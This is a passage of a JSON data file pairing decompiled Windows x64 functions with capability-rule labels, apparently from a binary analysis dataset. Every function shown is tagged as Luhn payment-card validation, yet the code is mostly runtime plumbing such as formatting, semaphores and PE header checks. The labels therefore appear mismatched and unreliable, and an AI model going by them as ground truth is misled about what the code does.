goto joined_r0x00014000c559;\n    }\ncode_r0x00014000c5db:\n    iVar3 = *(arg1 + 0x80);\njoined_r0x00014000c747:\n    if (iVar3 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n        *arg1 = 0x20;\n        iVar4 = 1;\n        *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\ncode_r0x00014000c55f:\n        iVar3 = iVar4 + 1;\n        *(arg1 + 0x80) = iVar3;\n        *(arg1 + iVar4) = 0x5b;\n        *(arg1 + 0x84) = 0x5b;\n        iVar4 = *(arg3 + 0x10);\n        if (iVar4 != 0) {\ncode_r0x00014000c57e:\n            fcn.14000b4c0(arg1, 0x11, iVar4);\n            iVar3 = *(arg1 + 0x80);\n        }\n        if (iVar3 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n            *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n            iVar4 = 1;\n            iVar3 = 0;\n            goto code_r0x00014000c5a2;\n        }\n    }\n    else {\n        iVar4 = iVar3 + 1;\n        *(arg1 + 0x80) = iVar4;\n        *(arg1 + iVar3) = 0x20;\n        *(arg1 + 0x84) = 0x20;\njoined_r0x00014000c559:\n        if (iVar4 != 0xff) goto code_r0x00014000c55f;\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n        *arg1 = 0x5b;\n        *(arg1 + 0x84) = 0x5b;\n        iVar4 = *(arg3 + 0x10);\n        *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n        *(arg1 + 0x80) = 1;\n        if (iVar4 != 0) goto code_r0x00014000c57e;\n        iVar3 = 1;\n    }\n    iVar4 = iVar3 + 1;\ncode_r0x00014000c5a2:\n    *(arg1 + 0x80) = iVar4;\n    *(arg1 + iVar3) = 0x5d;\n    *(arg1 + 0x84) = 0x5d;\n    return;\ncode_r0x00014000c518:\n    piVar2 = *piVar2;\n    if (piVar2 == NULL) goto code_r0x00014000c5c8;\n    goto code_r0x00014000c524;\ncode_r0x00014000c5c8:\n    fcn.14000c170(arg1, 0x11, arg4, 0);\n    goto code_r0x00014000c5db;\n}\n",
        "token_count": 1413
    },
    "14000d69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.14000d690(int64_t arg1, int64_t arg2, uint64_t *arg3, uint *arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iStack72;\n    uchar auStack64 [16];\n    int32_t iStack48;\n    \n    if ((arg1 == 0) || ((arg2 != 0 && (arg3 == NULL)))) {\n        if (arg4 == NULL) {\n            return 0;\n        }\n        *arg4 = 0xfffffffd;\n        return 0;\n    }\n    iStack72 = 0;\n    iStack48 = 0;\n    auStack64 = 0x0;\n    iVar1 = fcn.14000c880(arg1, 0x140004bc0, &iStack72);\n    iVar3 = iStack72;\n    if (iVar1 == 0) {\n        fcn.1400185e0(iStack72);\n        if (arg4 == NULL) {\n            return 0;\n        }\ncode_r0x00014000d7cf:\n        *arg4 = 0xfffffffe;\n        return 0;\n    }\n    if (iStack48 == 0) {\n        if (iStack72 == 0) {\n            if (arg4 == NULL) {\n                return 0;\n            }\n            if (auStack64._8_8_ != 1) goto code_r0x00014000d7cf;\n            goto code_r0x00014000d775;\n        }\n    }\n    else {\n        auStack64._8_8_ = 1;\n        if (iStack72 == 0) {\n            if (arg4 == NULL) {\n                return 0;\n            }\ncode_r0x00014000d775:\n            *arg4 = 0xffffffff;\n            return 0;\n        }\n    }\n    if (arg2 == 0) {\n        if (arg3 == NULL) goto code_r0x00014000d73e;\n    }\n    else {\n        uVar2 = sub.msvcrt.dll_strlen(iStack72);\n        if (uVar2 < *arg3) {\n            sub.msvcrt.dll_memcpy(arg2, iVar3, uVar2 + 1);\n            fcn.1400185e0(iVar3);\n            iVar3 = arg2;\n            goto code_r0x00014000d73e;\n        }\n        fcn.1400185e0(arg2);\n    }\n    *arg3 = auStack64._8_8_;\ncode_r0x00014000d73e:\n    if (arg4 != NULL) {\n        *arg4 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 610
    },
    "14000e21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000e210(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x140129120);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x140129100; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00014000e279. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140129120);\n    return;\n}\n",
        "token_count": 243
    },
    "1400188b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400188b0(ulong arg1, int64_t arg2)\n\n{\n    uint *puVar1;\n    \n    if (arg2 == 0) {\n        return 0;\n    }\n    if (*0x140129108 != 0) {\n        puVar1 = sub.msvcrt.dll_calloc(1, 0x18);\n        if (puVar1 == NULL) {\n            return 0xffffffff;\n        }\n        *(puVar1 + 2) = arg2;\n        *puVar1 = arg1;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x140129120);\n        *(puVar1 + 4) = *0x140129100;\n        *0x140129100 = puVar1;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140129120);\n    }\n    return 0;\n}\n",
        "token_count": 194
    },
    "14000e5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000e5a0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    \n    if (((**0x140103640 == 0x5a4d) && (piVar3 = *(*0x140103640 + 0x1e) + *0x140103640,  *piVar3 == 0x4550)) &&\n       (*(piVar3 + 6) == 0x20b)) {\n        iVar2 = piVar3 + *(piVar3 + 5) + 0x18;\n        if (*(piVar3 + 6) != 0) {\n            iVar1 = iVar2 + 0x28;\n            do {\n                if ((*(iVar2 + 0xc) <= arg1 - *0x140103640) && (arg1 - *0x140103640 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                    return iVar2;\n                }\n                iVar2 = iVar2 + 0x28;\n            } while (iVar2 != iVar1 + (*(piVar3 + 6) - 1) * 0x28);\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 284
    },
    "14000e62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.14000e620(void)\n\n{\n    int32_t *piVar1;\n    \n    if (((**0x140103640 == 0x5a4d) && (piVar1 = *0x140103640 + *(*0x140103640 + 0x1e),  *piVar1 == 0x4550)) &&\n       (*(piVar1 + 6) == 0x20b)) {\n        return *(piVar1 + 6);\n    }\n    return 0;\n}\n",
        "token_count": 114
    },
    "14000e6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.14000e6e0(void)\n\n{\n    int16_t *piVar1;\n    \n    if ((**0x140103640 == 0x5a4d) && (*(*(*0x140103640 + 0x1e) + *0x140103640) == 0x4550)) {\n        piVar1 = NULL;\n        if (*(*(*0x140103640 + 0x1e) + *0x140103640 + 6) == 0x20b) {\n            piVar1 = *0x140103640;\n        }\n        return piVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 147
    },
    "14000e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000e8c0(int32_t *arg1, code *arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    if ((arg1 != NULL) && (arg2 != NULL)) {\n        if (*arg1 == 0) {\n            LOCK();\n            piVar1 = arg1 + 1;\n            *piVar1 = *piVar1 + 1;\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (*piVar1 == 0) {\n                (*arg2)();\n                *arg1 = 1;\n            }\n            else {\n                iVar2 = *arg1;\n                while (iVar2 == 0) {\n                    (*pcVar3)(0);\n                    iVar2 = *arg1;\n                }\n            }\n        }\n        return 0;\n    }\n    return 0x16;\n}\n",
        "token_count": 201
    },
    "14000ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000ea00(uint *arg1)\n\n{\n    ulong uVar1;\n    \n    *arg1 = 0xffffffff;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    *(arg1 + 2) = uVar1;\n    return;\n}\n",
        "token_count": 77
    },
    "14000ea4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000ea40(int32_t *hHandle)\n\n{\n    int32_t iVar1;\n    \n    LOCK();\n    *hHandle = *hHandle + 1;\n    if (*hHandle != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(hHandle + 2), 0xffffffff);\n        if (iVar1 != 0) {\n            LOCK();\n            *hHandle = *hHandle + -1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "14000eab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.14000eab0(int32_t *hSemaphore)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    LOCK();\n    *hSemaphore = *hSemaphore + -1;\n    bVar2 = false;\n    if (-1 < *hSemaphore) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(hSemaphore + 2), 1, 0);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 112
    },
    "14000eae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000eae0(ulong *arg1)\n\n{\n    ulong uVar1;\n    \n    *arg1 = *0x140102350;\n    *(arg1 + 1) = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "14000eb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000eb20(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    LOCK();\n    *arg1 = *arg1 + 1;\n    if (*arg1 != 0) {\n        if (arg1[2] == iVar1) {\n            LOCK();\n            *arg1 = *arg1 + -1;\n            arg1[1] = arg1[1] + 1;\n            return 0;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(arg1 + 4), 0xffffffff);\n        if (iVar2 != 0) {\n            LOCK();\n            *arg1 = *arg1 + -1;\n            return 1;\n        }\n    }\n    arg1[1] = 1;\n    arg1[2] = iVar1;\n    return 0;\n}\n",
        "token_count": 213
    },
    "14000ebe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.14000ebe0(int32_t *hSemaphore)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = hSemaphore + 1;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        hSemaphore[2] = 0;\n        LOCK();\n        *hSemaphore = *hSemaphore + -1;\n        if (-1 < *hSemaphore) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(hSemaphore + 4), 1, 0);\n            return iVar2 == 0;\n        }\n    }\n    return false;\n}\n",
        "token_count": 151
    },
    "14000ed4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000ed40(int64_t arg1)\n\n{\n    return **(*(arg1 + 0x20) + 0x10) + *(*(arg1 + 0x20) + 8);\n}\n",
        "token_count": 52
    },
    "14000efc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000efc0(int64_t arg1)\n\n{\n    int64_t aiStackX8 [4];\n    \n    *(arg1 + 0x10) = 0x0;\n    *(arg1 + 0x20) = 0x0;\n    *(arg1 + 0x30) = 0x0;\n    aiStackX8[0] = arg1;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0, 0x20474343, 0, 1, aiStackX8);\n    return 5;\n}\n",
        "token_count": 128
    },
    "14000f95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.14000f950(ushort param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cStack15;\n    ushort uStack14;\n    int32_t aiStack12 [3];\n    \n    aiStack12[0] = 0;\n    uStack14 = param_1;\n    uVar1 = sub.msvcrt.dll____lc_codepage_func();\n    iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar1, 0, &uStack14, 1, &cStack15, 1, 0, aiStack12);\n    if ((iVar2 == 0) || (aiStack12[0] != 0)) {\n        iVar2 = -1;\n    }\n    else {\n        iVar2 = cStack15;\n    }\n    return iVar2;\n}\n",
        "token_count": 189
    },
    "140025e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.140025e80(ulong param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    \n    if (param_2 < 0x41) {\n    // switch table (65 cases) at 0x1400fdc10\n        switch(param_2) {\n        case 1:\n            pcVar2 = 0x1400fdbd8;\n            break;\n        case 2:\n            pcVar2 = 0x1400fdbde;\n            break;\n        case 3:\n        case 5:\n        case 6:\n        case 7:\n        case 9:\n        case 10:\n        case 0xb:\n        case 0xd:\n        case 0xe:\n        case 0xf:\n        case 0x11:\n        case 0x12:\n        case 0x13:\n        case 0x14:\n        case 0x15:\n        case 0x16:\n        case 0x17:\n        case 0x18:\n        case 0x19:\n        case 0x1a:\n        case 0x1b:\n        case 0x1c:\n        case 0x1d:\n        case 0x1e:\n        case 0x1f:\n        case 0x21:\n        case 0x22:\n        case 0x23:\n        case 0x24:\n        case 0x25:\n        case 0x26:\n        case 0x27:\n        case 0x28:\n        case 0x29:\n        case 0x2a:\n        case 0x2b:\n        case 0x2c:\n        case 0x2d:\n        case 0x2e:\n        case 0x2f:\n        case 0x30:\n        case 0x31:\n        case 0x32:\n        case 0x33:\n        case 0x34:\n        case 0x35:\n        case 0x36:\n        case 0x37:\n        case 0x38:\n        case 0x39:\n        case 0x3a:\n        case 0x3b:\n        case 0x3c:\n        case 0x3d:\n        case 0x3e:\n        case 0x3f:\n            goto code_r0x000140025f83;\n        case 4:\n            pcVar2 = 0x1400fdbe4;\n            break;\n        case 8:\n            pcVar2 = 0x1400fdbea;\n            break;\n        case 0xc:\n            pcVar2 = 0x1400fdbfd;\n            break;\n        case 0x10:\n            pcVar2 = 0x1400fdbf6;\n            break;\n        case 0x20:\n            pcVar2 = 0x1400fdbc6;\n            break;\n        case 0x40:\n            pcVar2 = 0x1400fdbcc;\n            break;\n        default:\n            goto code_r0x000140025f80;\n        }\n    }\n    else {\n        if (param_2 == 0x200) {\n            pcVar2 = 0x1400fdbf0;\n            goto code_r0x00014000f9d0;\n        }\n        if (param_2 == 0x20c) {\n            pcVar2 = 0x1400fdc03;\n            goto code_r0x00014000f9d0;\n        }\n        if (param_2 == 0x100) {\n            pcVar2 = 0x1400fdbd2;\n            goto code_r0x00014000f9d0;\n        }\ncode_r0x000140025f83:\n        if (param_2 != 0x400) {\ncode_r0x000140025f80:\n            return 0;\n        }\n        pcVar2 = \"blank\";\n    }\ncode_r0x00014000f9d0:\n    iVar3 = 0;\n    puVar4 = 0x140102440;\n    do {\n        iVar1 = sub.msvcrt.dll_strcmp(pcVar2, *puVar4);\n        if (iVar1 == 0) {\n            return *(iVar3 * 0x10 + 0x140102448);\n        }\n        iVar3 = iVar3 + 1;\n        puVar4 = puVar4 + 2;\n    } while (iVar3 != 0xb);\n    return 0;\n}\n",
        "token_count": 998
    },
    "14000fae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000fae0(ulong stream)\n\n{\n    int32_t iVar1;\n    ulong auStack16 [2];\n    \n    iVar1 = sub.msvcrt.dll_fgetpos(stream, auStack16);\n    if (iVar1 != 0) {\n        auStack16[0] = 0xffffffffffffffff;\n    }\n    return auStack16[0];\n}\n",
        "token_count": 83
    },
    "14000fb7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000fb70(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (arg2 != 0) {\n        iVar2 = arg2 - 1U;\n        iVar1 = fcn.140013a70(0, arg1, arg2 - 1U & 0xffffffff, arg3);\n        if (iVar1 <= iVar2) {\n            iVar2 = iVar1;\n        }\n        *(arg1 + iVar2) = 0;\n        return;\n    }\n    fcn.140013a70(0, arg1, 0, arg3);\n    return;\n}\n",
        "token_count": 157
    },
    "14001009": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140010090(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    iVar1 = *(arg1 + 0x14);\n    piVar3 = arg1 + 0x18;\n    do {\n        if (*piVar3 != 0) {\n            *piVar3 = *piVar3 + -1;\n            return;\n        }\n        piVar2 = piVar3 + 1;\n        *piVar3 = -1;\n        piVar3 = piVar2;\n    } while (piVar2 < arg1 + 0x18 + iVar1);\n    return;\n}\n",
        "token_count": 153
    },
    "140011f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140011f70(ulong arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t arg2_00;\n    uint16_t uVar2;\n    uint32_t *in_stack_00000028;\n    uint auStack36 [3];\n    int64_t iStack24;\n    uint32_t uStack16;\n    \n    iStack24 = *arg2;\n    uStack16 = *(arg2 + 1);\n    uVar2 = uStack16 & 0x7fff;\n    uVar1 = iStack24 >> 0x20;\n    if ((uStack16 & 0x7fff) == 0) {\n        if ((iStack24 | uVar1) == 0) {\n            auStack36[0] = 0;\n            arg2_00 = 0;\n        }\n        else {\n            if (iStack24 < 0) goto code_r0x000140011fab;\n            auStack36[0] = 2;\n            arg2_00 = 0xffffbfc3;\n        }\n    }\n    else if (uVar2 == 0x7fff) {\n        if ((uVar1 & 0x7fffffff | iStack24) != 0) {\n            auStack36[0] = 4;\n            arg2_00 = 0;\n            uVar1 = 0;\n            goto code_r0x000140011fc4;\n        }\n        auStack36[0] = 3;\n        arg2_00 = 0;\n    }\n    else {\ncode_r0x000140011fab:\n        auStack36[0] = 1;\n        arg2_00 = uVar2 + 0xbfc2;\n    }\n    uVar1 = uStack16 & 0x8000;\ncode_r0x000140011fc4:\n    *in_stack_00000028 = uVar1;\n    fcn.1400147b0(0x1400f94b0, arg2_00, &iStack24, auStack36);\n    return;\n}\n",
        "token_count": 466
    },
    "14001206": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012060(ulong c, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    \n    if (((*(arg2 + 1) & 0x4000) != 0) || (iVar1 = *(arg2 + 0x24),  *(arg2 + 5) != iVar1 && iVar1 <= *(arg2 + 5))) {\n        if ((*(arg2 + 1) & 0x2000) != 0) {\n            sub.msvcrt.dll_fputc(c, *arg2);\n            *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            return;\n        }\n        *(*arg2 + *(arg2 + 0x24)) = c;\n        iVar1 = *(arg2 + 0x24);\n    }\n    *(arg2 + 0x24) = iVar1 + 1;\n    return;\n}\n",
        "token_count": 204
    },
    "1400123a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400123a0(uchar *arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    \n    if (arg1 == NULL) {\n        arg1 = 0x140102680;\n    }\n    if (*(arg2 + 2) < 0) {\n        uVar3 = sub.msvcrt.dll_strlen();\n    }\n    else {\n        uVar3 = fcn.140017d80(arg1, *(arg2 + 2));\n    }\n    uVar1 = *(arg2 + 2);\n    uVar4 = uVar1;\n    if (uVar3 <= uVar1) {\n        uVar4 = uVar3;\n    }\n    if (-1 < uVar1) {\n        uVar3 = uVar4;\n    }\n    if (uVar3 < *(arg2 + 0xc)) {\n        iVar2 = *(arg2 + 0xc) - uVar3;\n        *(arg2 + 0xc) = iVar2;\n        uVar1 = *(arg2 + 1);\n        if ((uVar1 & 0x400) == 0) {\n            *(arg2 + 0xc) = iVar2 + -1;\n            do {\n                fcn.140012060(0x20, arg2);\n                iVar2 = *(arg2 + 0xc);\n                *(arg2 + 0xc) = iVar2 + -1;\n            } while (iVar2 != 0);\n            if (uVar3 == 0) goto code_r0x0001400122f1;\n            goto code_r0x00014001228e;\n        }\n        if (uVar3 == 0) {\n            *(arg2 + 0xc) = *(arg2 + 0xc) + -1;\n            goto code_r0x000140012301;\n        }\n    }\n    else {\n        *(arg2 + 0xc) = 0xffffffff;\n        if (uVar3 == 0) {\n            *(arg2 + 0xc) = 0xfffffffe;\n            return;\n        }\ncode_r0x00014001228e:\n        uVar1 = *(arg2 + 1);\n    }\n    puVar5 = arg1;\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = *puVar5;\n                iVar2 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar2 + 1;\n        if (puVar5 + 1 == arg1 + uVar3) break;\n        uVar1 = *(arg2 + 1);\n        puVar5 = puVar5 + 1;\n    }\ncode_r0x0001400122f1:\n    while (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2) {\n        uVar1 = *(arg2 + 1);\ncode_r0x000140012301:\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar2 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar2 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 953
    },
    "1400132d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400132d0(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    ulong arg2_00;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t auStack28 [3];\n    \n    aStack56[0] = *noname_0;\n    if (*(arg2 + 0x10) < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 7;\n    }\n    else {\n        arg3 = *(arg2 + 0x10) + 1;\n    }\n    arg2_00 = fcn.140011f70(2, aStack56, arg3, auStack28);\n    if (auStack28[0] != 0xffff8000) {\n        fcn.140013200(uStack32, arg2_00, auStack28[0], arg2);\n        fcn.140014600(arg2_00);\n        return;\n    }\n    fcn.1400123f0(uStack32, arg2_00, arg2);\n    fcn.140014600(arg2_00);\n    return;\n}\n",
        "token_count": 268
    },
    "14001337": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140013370(unkbyte10 *noname_0, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    ulong arg2_00;\n    int32_t iVar2;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t auStack28 [3];\n    \n    arg3 = *(arg2 + 2);\n    aStack56[0] = *noname_0;\n    if (*(arg2 + 2) < 0) {\n        *(arg2 + 2) = 6;\n        arg3 = 6;\n    }\n    arg2_00 = fcn.140011f70(3, aStack56, arg3, auStack28);\n    if (auStack28[0] == 0xffff8000) {\n        fcn.1400123f0(uStack32, arg2_00, arg2);\n    }\n    else {\n        fcn.140012e20(uStack32, arg2_00, auStack28[0], arg2);\n        iVar1 = *(arg2 + 0xc);\n        while( true ) {\n            *(arg2 + 0xc) = iVar1 + -1;\n            if (iVar1 < 1) break;\n            if (((*(arg2 + 1) & 0x4000) != 0) ||\n               (iVar2 = *(arg2 + 0x24),  iVar1 = iVar1 + -1,  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n                if ((*(arg2 + 1) & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                    iVar2 = *(arg2 + 0x24);\n                    iVar1 = *(arg2 + 0xc);\n                }\n                else {\n                    sub.msvcrt.dll_fputc();\n                    iVar2 = *(arg2 + 0x24);\n                    iVar1 = *(arg2 + 0xc);\n                }\n            }\n            *(arg2 + 0x24) = iVar2 + 1;\n        }\n    }\n    fcn.140014600(arg2_00);\n    return;\n}\n",
        "token_count": 500
    },
    "14001345": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140013450(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    uVar1 = *(arg2 + 0x10);\n    arg3 = uVar1;\n    aStack56[0] = *noname_0;\n    if (uVar1 < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 6;\n    }\n    else if (uVar1 == 0) {\n        *(arg2 + 0x10) = 1;\n        arg3 = 1;\n    }\n    arg2_00 = fcn.140011f70(2, aStack56, arg3, &uStack28);\n    if (uStack28 != 0xffff8000) {\n        uVar1 = *(arg2 + 8) & 0x800;\n        if (-4 < uStack28) {\n            if (uStack28 <= *(arg2 + 0x10)) {\n                if (uVar1 == 0) {\n                    iVar2 = sub.msvcrt.dll_strlen();\n                    iVar2 = iVar2 - uStack28;\n                    *(arg2 + 0x10) = iVar2;\n                    if ((iVar2 < 0) && (0 < *(arg2 + 0xc))) {\n                        *(arg2 + 0xc) = iVar2 + *(arg2 + 0xc);\n                    }\n                }\n                else {\n                    *(arg2 + 0x10) = *(arg2 + 0x10) - uStack28;\n                }\n                fcn.140012e20(uStack32, arg2_00, uStack28, arg2);\n                while (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2) {\n                    fcn.140012060(0x20, arg2);\n                }\n                fcn.140014600(arg2_00);\n                return;\n            }\n        }\n        if (uVar1 == 0) {\n            iVar2 = sub.msvcrt.dll_strlen();\n        }\n        else {\n            iVar2 = *(arg2 + 0x10);\n        }\n        *(arg2 + 0x10) = iVar2 + -1;\n        fcn.140013200(uStack32, arg2_00, uStack28, arg2);\n        fcn.140014600(arg2_00);\n        return;\n    }\n    